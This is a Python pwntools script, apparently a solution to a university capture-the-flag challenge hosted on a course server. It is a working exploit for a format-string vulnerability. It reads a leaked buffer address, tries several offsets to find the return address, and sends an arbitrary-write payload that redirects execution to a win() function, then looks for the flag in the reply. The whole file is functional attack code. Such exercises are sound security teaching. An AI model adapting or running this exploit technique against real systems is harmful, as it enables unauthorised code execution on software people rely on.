#!/usr/bin/env python3

from pwn import *

def exploit_format_string():
    """
    Format String Vulnerability - Arbitrary Write
    Sobrescribir dirección de retorno para ejecutar win()
    """
    
    host = 'ic.catedras.linti.unlp.edu.ar'
    port = 15019
    
    binary_name = 'reto-bfs'
    offset_arg = 4
    
    try:
        elf = ELF(binary_name, checksec=False)
        win_addr = elf.symbols['win']
    except:
        win_addr = 0x080484b4
    
    print(f"[+] Win function: {hex(win_addr)}")
    print(f"[*] Offset: {offset_arg}\n")
    
    distancias = [68, 72, 76, 80, 84, 88, 92, 96]
    
    for dist in distancias:
        try:
            con = remote(host, port, timeout=5)
            
            con.recvuntil(b'buffer comienza en: ', timeout=3)
            leak_line = con.recvline().strip()
            
            buffer_addr = int(leak_line, 16)
            target = buffer_addr + dist
            
            print(f"[*] Probando padding {dist}: ", end='', flush=True)
            
            payload = fmtstr_payload(offset_arg, {target: win_addr}, write_size='short')
            
            if len(payload) > 64:
                print(f"payload > 64 bytes")
                con.close()
                continue
            
            con.sendlineafter(b'input:', payload)
            respuesta = con.recvall(timeout=2)
            respuesta_text = respuesta.decode(errors='ignore')
            
            if "IC{" in respuesta_text:
                print("¡VULNERABLE!\n")
                for line in respuesta_text.split('\n'):
                    if line.strip():
                        print(f"    {line}")
                con.close()
                return
            
            print("no")
            con.close()
            
        except Exception as e:
            print(f"error")
            try:
                con.close()
            except:
                pass
    
    print("\n[-] Exploit fallido")

if __name__ == "__main__":
    print("="*60)
    print("FORMAT STRING - ARBITRARY WRITE EXPLOIT")
    print("="*60 + "\n")
    
    exploit_format_string()
